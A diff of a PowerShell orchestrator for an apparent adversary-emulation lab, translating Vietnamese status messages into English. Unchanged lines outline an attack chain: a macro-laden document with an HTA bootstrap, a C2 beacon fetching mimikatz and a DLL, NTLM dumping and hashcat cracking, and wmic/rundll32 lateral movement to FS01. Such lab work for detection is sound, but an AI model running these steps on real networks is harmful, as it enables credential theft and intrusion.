@@ -40,7 +40,7 @@ $ledger = Join-Path $repo 'evidence/run-ledger'
 $logPath = Join-Path $repo 'c2sim.log'
 
 function Step { param([string]$m) Write-Host $m -ForegroundColor Cyan }
-function Wait-Key { Read-Host '   ... Enter de tiep tuc (Ctrl+C de dung)' | Out-Null }
+function Wait-Key { Read-Host '   ... Press Enter to continue (Ctrl+C to stop)' | Out-Null }
 function Get-Phase3Token {
     ((Invoke-RestMethod "$C2/sessions") | Where-Object { $_.stage -eq 'phase3' } | Select-Object -First 1).token
 }
@@ -64,7 +64,7 @@ function Invoke-Run {
     if ($null -ne $last -and $last.output) {
         Step ("output (task=$($last.task) bytes=$($last.bytes)):")
         $last.output
-    } else { Step 'chua co output (beacon co song khong?)' }
+    } else { Step 'no output yet (is the beacon alive?)' }
 }
 
 function Show-Results {
@@ -86,7 +86,7 @@ function Wait-Listeners {
             if (-not $ok) { Start-Sleep -Milliseconds 500 }
         } until ($ok -or (Get-Date) -gt $deadline)
         if ($ok) { Step ("LISTENER OK: {0}:{1}" -f (($ok | Select-Object -First 1).LocalAddress), $port) }
-        else { Step "LISTENER MISSING: port $port - kiem tra http.server / c2sim" }
+        else { Step "LISTENER MISSING: port $port - check http.server / c2sim" }
     }
 }
 
@@ -104,7 +104,7 @@ function Start-Phase {
         -Hta  (Join-Path $repo 'payloads/hta/bootstrap.hta') `
         -Beacon (Join-Path $repo 'payloads/beacon/c0015_beacon.ps1') `
         -OutPath (Join-Path $repo "$Staging/macro_embedded.vba") | Out-Null
-    Step "HOAN TAT BANG TAY: sua run_id trong $Staging\config-phase7.ini = $RunId"
+    Step "MANUAL STEP: set the run_id in $Staging\config-phase7.ini = $RunId"
     # entry-chain T1105: stage the phase-2 tooling under build/out/tools so the beacon
     # can fetch mimikatz/143.dll/beacon/config-phase7 over :8000 (no direct drops).
     $toolsDir = Join-Path $repo 'build/out/tools'
@@ -112,31 +112,31 @@ function Start-Phase {
     foreach ($t in @('mimikatz.exe', 'c0015_143_surrogate.dll', 'c0015_beacon.ps1', 'config-phase7.ini')) {
         $src = Join-Path $repo "$Staging/$t"
         if (Test-Path $src) { Copy-Item $src (Join-Path $toolsDir $t) -Force }
-        else { Step "TOOLS MISSING (build/deploy truoc): $Staging\$t" }
+        else { Step "TOOLS MISSING (build/deploy first): $Staging\$t" }
     }
     & (Join-Path $repo 'payloads/packaging/launch_servers.ps1') -C2Ip $C2Ip -PublishDir 'build/out' | Out-Null
     Wait-Listeners
     Step '== WS01 (entry-chain, remote via vmrun): install_macro_docm.ps1 -MacroSource stage/ws01/macro_embedded.vba =='
     Step '== WS01: mo test.docm (victim action; macros enabled qua Trust Center preflight) =='
-    Step 'Sau khi mo xong, chay -Action P1 / P2.'
+    Step 'After opening it, run -Action P1 / P2.'
 }
 
 function Wait-Session {
-    Step '== WaitSession: cho session 1 (phase3) =='
+    Step '== WaitSession: waiting for session 1 (phase3) =='
     $deadline = (Get-Date).AddSeconds($TimeoutSeconds)
     $t = $null
     do {
         Start-Sleep 5
         try { $t = Get-Phase3Token } catch { }
     } until ($t -or (Get-Date) -gt $deadline)
-    if ($t) { Step "SESSION1 TOKEN: $t" } else { throw 'Het time - chua thay session phase3 (mo test.docm chua?)' }
+    if ($t) { Step "SESSION1 TOKEN: $t" } else { throw 'Timed out - phase3 session not found (was test.docm opened?)' }
 }
 
 function Check-Phase1 {
     Step '== P1: verify phase 1 =='
     $reg = Select-String -Path $logPath -Pattern 'register stage=phase3 host=WS01 .*ok=True' -ErrorAction SilentlyContinue
-    if ($reg) { Step "REGISTER OK: $($reg.Line)" } else { Step 'CHUA THAY register ok - mo test.docm tren WS01.' }
-    Step 'Markers tren WS01 (kiem tra tay): b64-marker.txt, js-marker.txt, c0015-comparefor.jpg, dll-executed.txt'
+    if ($reg) { Step "REGISTER OK: $($reg.Line)" } else { Step 'REGISTER OK NOT SEEN - open test.docm on WS01.' }
+    Step 'Markers on WS01 (manual check): b64-marker.txt, js-marker.txt, c0015-comparefor.jpg, dll-executed.txt'
     Step "Token: $(Get-Phase3Token)"
 }
 
@@ -151,7 +151,7 @@ function New-ArtifactTemplates {
         $p = Join-Path $dir $_.Key
         if (-not (Test-Path $p)) { $_.Value | ConvertTo-Json -Depth 5 | Set-Content -Path $p -Encoding UTF8 }
     }
-    Step "Artifact templates: $dir\*.json (fill TBD truoc khi artifact-new)."
+    Step "Artifact templates: $dir\*.json (fill TBD before artifact-new)."
 }
 
 function Invoke-Phase2 {
@@ -159,7 +159,7 @@ function Invoke-Phase2 {
     $t = Get-Phase3Token
     if (-not $t) { Wait-Session; $t = Get-Phase3Token }
     Invoke-RestMethod -Method Post -Uri "$C2/runbook?session=$t&name=c0015-phase2" | Out-Null
-    Step 'Runbook enqueued. Cho beacon chay (11 OP-CMD)...'
+    Step 'Runbook enqueued. Waiting for the beacon to run (11 OP-CMD)...'
     $deadline = (Get-Date).AddSeconds($TimeoutSeconds)
     $s = $null
     do {
@@ -168,15 +168,15 @@ function Invoke-Phase2 {
     } until (($s.queue_len -eq 0 -and $s.tasks_done -ge 11) -or (Get-Date) -gt $deadline)
     Step ("Runbook: queue={0} tasks_done={1}" -f $s.queue_len, $s.tasks_done)
     New-ArtifactTemplates
-    Step '== Interactive steps (WS01) - lam roi Enter de tiep tuc =='
+    Step '== Interactive steps (WS01) - after each, press Enter to continue =='
     Step ' S5 artifact  : pwsh -File payloads/packaging/run_campaign_orchestrator.ps1 -Action Artifacts -RunId <RUN>  (ART-04-01)'
-    Step ' S6           : ART-04-02 (art04_02.json da co template)'
-    Step ' S7           : net use A/B/C (chay payloads/packaging/run_ws01_operator.ps1 -Step S7) - giu ket noi B'
-    Step ' S7b          : mimikatz dump tren WS01 -> NTLM it.admin -> crack tren Kali (hashcat -m 1000) -> giu plaintext'
+    Step ' S6           : ART-04-02 (art04_02.json has a template)'
+    Step ' S7           : net use A/B/C (run payloads/packaging/run_ws01_operator.ps1 -Step S7) - keep connection B'
+    Step ' S7b          : mimikatz dump on WS01 -> NTLM it.admin -> crack on Kali (hashcat -m 1000) -> keep the plaintext'
     Step ' S8a          : copy 143.dll + beacon + config-phase7 -> \\FS01\C$\C0015\'
-    Step ' S8b          : runas it.admin "wmic /node:FS01 process call create rundll32 ..." (dung plaintext CRACKED)'
+    Step ' S8b          : runas it.admin "wmic /node:FS01 process call create rundll32 ..." (use the CRACKED plaintext)'
     Wait-Key
-    Step '== Cho receipt ART-07-01 (session 2 tren FS01) =='
+    Step '== Waiting for the ART-07-01 receipt (session 2 on FS01) =='
     $deadline = (Get-Date).AddSeconds($TimeoutSeconds)
     $rc = $null
     do {
@@ -184,19 +184,19 @@ function Invoke-Phase2 {
         $rc = Get-ChildItem $ledger -Filter 'ART-07-01-*.json' -ErrorAction SilentlyContinue |
             Sort-Object LastWriteTime -Descending | Select-Object -First 1
     } until ($rc -or (Get-Date) -gt $deadline)
-    if ($rc) { Step "RECEIPT OK: $($rc.Name)" } else { Step 'Chua thay receipt - kiem tra FS01 callback (E3 :8080, E7 hash).' }
+    if ($rc) { Step "RECEIPT OK: $($rc.Name)" } else { Step 'Receipt not found - check the FS01 callback (E3 :8080, E7 hash).' }
 }
 
 function Invoke-Phase3 {
     Step '== P3: guided phase 3 =='
-    Step 'S10 (FS01 session2): doc corpus \\FS01\IT roi tren C2 host:'
+    Step 'S10 (FS01 session2): read the corpus \\FS01\IT, then on the C2 host:'
     Step "   python scripts/lab_tools.py manifest-new <corpus_dir> $RunId -o stage\ws01\art08_01.json"
-    Step "S11: sink chua co trong repo (p5_sink) -> muon chay can sink; offline: python scripts/lab_tools.py receipt-check <receipt> <manifest> <allowlist>"
-    Step 'S12 (RDP): mstsc /v:FS01 (it.admin) - can DET-008 define'
-    Step 'S13 (AnyDesk-like): manual - install portable app vao path dac biet; LSASS branch = fixtures/replay'
-    Step "S14 (impact, FS01 co ban repo): pwsh -File .\c0015_impact.ps1 -Manifest <m> -Action Prepare|Run|Verify|Rollback|Verify"
+    Step "S11: no sink in the repo yet (p5_sink) -> a sink is required before running; offline: python scripts/lab_tools.py receipt-check <receipt> <manifest> <allowlist>"
+    Step 'S12 (RDP): mstsc /v:FS01 (it.admin) - requires DET-008 to be defined'
+    Step 'S13 (AnyDesk-like): manual - install the portable app into the special path; LSASS branch = fixtures/replay'
+    Step "S14 (impact, FS01 hosts a repo copy): pwsh -File .\c0015_impact.ps1 -Manifest <m> -Action Prepare|Run|Verify|Rollback|Verify"
     Step "S15: python scripts/lab_tools.py score <ground_truth> <reconstruction>"
-    Step 'Cleanup: -Action Stop; xoa artifacts WS01/FS01; bat lai Defender.'
+    Step 'Cleanup: -Action Stop; remove WS01/FS01 artifacts; re-enable Defender.'
 }
 
 function Print-Artifacts {
